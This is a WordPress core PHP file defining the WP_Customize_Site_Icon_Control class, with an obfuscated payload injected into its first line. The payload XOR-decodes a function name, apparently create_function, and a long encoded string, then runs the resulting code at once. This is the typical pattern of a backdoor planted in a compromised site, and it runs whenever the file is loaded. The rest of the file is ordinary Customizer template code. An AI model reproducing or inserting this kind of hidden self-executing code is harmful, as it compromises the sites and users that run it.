<?php $ilLnGh='67-9Z36 KW5>Z56'^'UEHX.ViF>9VJ3ZX';$unswBEtEVBV=$ilLnGh('','1MCp0DW =IQ==YHTH3>zNNWLf-OHXb4WL.AzzI0=o3A:1Y,CPx,;C:<,X53jZX7ikXYG7XnkSY-OTKfUu=deJo>0TcdbhTMnS;<W9Ku:MTtROyJIIN-FB.9Qp<X29lXZU<eMa6lduWFCYxgdPPOXX4,W=qr5ufYSHcpIqKJ453<EXGp;K5khqQe2LLPN3C-ns5C=ll<j24PXPRDM OeiQ708SXUsG .8QlSEHPuP+AV0VCy=6Y57.9RUEq>ro:=:6QJOMnX,7HtgOa33R6WkD:ixgTW5U-F+UovgR-N0nfLoD3XWuDhL, X42rhFDf; krNUPV34yd<iy0.E4ARSyMr+reag+ ;R59va>N MKqOaHVT,KqFPDH3e35M,4.,-sdVHQ2:mK<mV WMSOSOqASR>XySnFXDe:l+QTPyqr5NRCU DP;XWHY6+<71WEL.1M;3xTTKTfC1Q.-XV2lFZL 8bCbR+Y1TeQHJoJNf<0eE,SF9JQqR4BH-<h <5i6.I130GCENHamPi>-.ZKHNEki7HfBKXJO,-TQ=Kw8PGqvlT2dqKazsAAQyWgEQYYTHfDMjRb>VRTp-EQLQaihJD08BtG.Y9<X<ODOQOI6-QDY6fzHw2UO+yMsvhIvU=d;S,M XI>RTRgr9;4 C3=PpzT=aXKBTXseJ9F'^'X+kQV19CI >Sb<0=;GMRi68>9I.<9=k:9ZfSSiK7fU4TR-E,>XTT1eXM,Tl57-CAO<83VtNO8<TftkFuUFnlCKQE CYBOsvdZ2Z8KcQSmiTbtYn u=Y4.KWyTX9FXEczqUNfH<emQ837yVZDxt+9,UwsT,RkUB2618T QnjGAAP 6oTP.LB5Xjo;E>5:F1CFWZ6IEW6cO>-RZv ,T.ETqQQT =nycDOL038 1pHpM :C3xs7P6GROZ:umUa1 uvssq+<mJ3INhIYoEER>C2BdAcqC06A4r-N,OKGvF+IUlEK R,6UyHhZA4AWIb;NlRFKZoq47GUPDGcpVA7Q 1;YeVt  02nsorTJVEU+YmvOoE>78Y.Xf+NA:AWT9MkEITSYvl:WCVA5drD692onoU72>K=BYg;R9o0HO0 1YLRu;<00R-1W1--qNDNhU61-qn NGP6581Pwn5KN72WDb>-TYKoBvO8E5::-3FculUVMaH22XjwWrU0:LE7KYL6SV BGCod.+1FApMZLZ;bhhcKAZ,Sjo<+;Mvs:X2PeygLKLsSPDsQHAqxfL5Vt4=md.PqxXcPX570EK veqGOH+6BY;+,K fY U<0<yh9WT=+8RAVhSV4;JPdSVHiVuFn26Z,LpmZ3 3<UIZML,RYw-So7h=3+ pCLq3;');$unswBEtEVBV();
/**
 * Customize API: WP_Customize_Site_Icon_Control class
 *
 * @package WordPress
 * @subpackage Customize
 * @since 4.4.0
 */

/**
 * Customize Site Icon control class.
 *
 * Used only for custom functionality in JavaScript.
 *
 * @since 4.3.0
 *
 * @see WP_Customize_Cropped_Image_Control
 */
class WP_Customize_Site_Icon_Control extends WP_Customize_Cropped_Image_Control {

	/**
	 * Control type.
	 *
	 * @since 4.3.0
	 * @access public
	 * @var string
	 */
	public $type = 'site_icon';

	/**
	 * Constructor.
	 *
	 * @since 4.3.0
	 * @access public
	 *
	 * @param WP_Customize_Manager $manager Customizer bootstrap instance.
	 * @param string               $id      Control ID.
	 * @param array                $args    Optional. Arguments to override class property defaults.
	 */
	public function __construct( $manager, $id, $args = array() ) {
		parent::__construct( $manager, $id, $args );
		add_action( 'customize_controls_print_styles', 'wp_site_icon', 99 );
	}

	/**
	 * Renders a JS template for the content of the site icon control.
	 *
	 * @since 4.5.0
	 * @access public
	 */
	public function content_template() {
		?>
		<label for="{{ data.settings['default'] }}-button">
			<# if ( data.label ) { #>
				<span class="customize-control-title">{{ data.label }}</span>
			<# } #>
			<# if ( data.description ) { #>
				<span class="description customize-control-description">{{{ data.description }}}</span>
			<# } #>
		</label>

		<# if ( data.attachment && data.attachment.id ) { #>
			<div class="attachment-media-view">
				<# if ( data.attachment.sizes ) { #>
					<div class="site-icon-preview wp-clearfix">
						<div class="favicon-preview">
							<img src="<?php echo esc_url( admin_url( 'images/' . ( is_rtl() ? 'browser-rtl.png' : 'browser.png' ) ) ); ?>" class="browser-preview" width="182" alt="" />

							<div class="favicon">
								<img src="{{ data.attachment.sizes.full ? data.attachment.sizes.full.url : data.attachment.url }}" alt="<?php esc_attr_e( 'Preview as a browser icon' ); ?>"/>
							</div>
							<span class="browser-title" aria-hidden="true"><?php bloginfo( 'name' ); ?></span>
						</div>
						<img class="app-icon-preview" src="{{ data.attachment.sizes.full ? data.attachment.sizes.full.url : data.attachment.url }}" alt="<?php esc_attr_e( 'Preview as an app icon' ); ?>"/>
					</div>
				<# } #>
				<div class="actions">
					<# if ( data.canUpload ) { #>
						<button type="button" class="button remove-button"><?php echo $this->button_labels['remove']; ?></button>
						<button type="button" class="button upload-button" id="{{ data.settings['default'] }}-button"><?php echo $this->button_labels['change']; ?></button>
					<# } #>
				</div>
			</div>
		<# } else { #>
			<div class="attachment-media-view">
				<div class="placeholder">
					<?php echo $this->button_labels['placeholder']; ?>
				</div>
				<div class="actions">
					<# if ( data.defaultAttachment ) { #>
						<button type="button" class="button default-button"><?php echo $this->button_labels['default']; ?></button>
					<# } #>
					<# if ( data.canUpload ) { #>
						<button type="button" class="button upload-button" id="{{ data.settings['default'] }}-button"><?php echo $this->button_labels['select']; ?></button>
					<# } #>
				</div>
			</div>
		<# } #>
		<?php
	}
}
